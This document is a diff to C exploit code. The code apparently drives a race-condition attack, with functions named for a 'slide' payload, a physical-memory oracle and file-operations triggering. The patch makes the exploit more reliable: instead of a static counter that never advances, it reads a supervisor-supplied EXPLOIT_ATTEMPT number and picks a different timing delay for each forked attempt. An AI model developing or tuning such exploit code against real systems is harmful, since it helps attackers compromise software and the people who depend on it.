@@ -675,7 +675,6 @@ static int slide_restore_physical_oracle(void) {
 }
 
 int app_trigger_fops_slide_route(void) {
-  static size_t delay_index;
   static const int delays[] = {
     70000, 60000, 80000, 40000, 90000, 50000,
     30000, 20000, 75000, 65000, 85000, 55000,
@@ -683,8 +682,21 @@ int app_trigger_fops_slide_route(void) {
   if (!select_slide_payload_index(0)) {
     return 0;
   }
-  int delay = delays[delay_index % (sizeof(delays) / sizeof(delays[0]))];
-  delay_index++;
+  // The supervisor forks a fresh process per attempt and calls this once,
+  // so a static rotation counter never advances and every attempt would
+  // use delays[0]. Index by the supervisor-provided attempt number instead.
+  int attempt = 1;
+  const char *attempt_arg = getenv("EXPLOIT_ATTEMPT");
+  if (attempt_arg && *attempt_arg) {
+    char *end = NULL;
+    errno = 0;
+    long value = strtol(attempt_arg, &end, 0);
+    if (!errno && end != attempt_arg && !*end && value >= 1 && value <= 64) {
+      attempt = (int)value;
+    }
+  }
+  int delay = delays[(size_t)(attempt - 1) %
+                     (sizeof(delays) / sizeof(delays[0]))];
   char delay_arg[16];
   snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
   SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
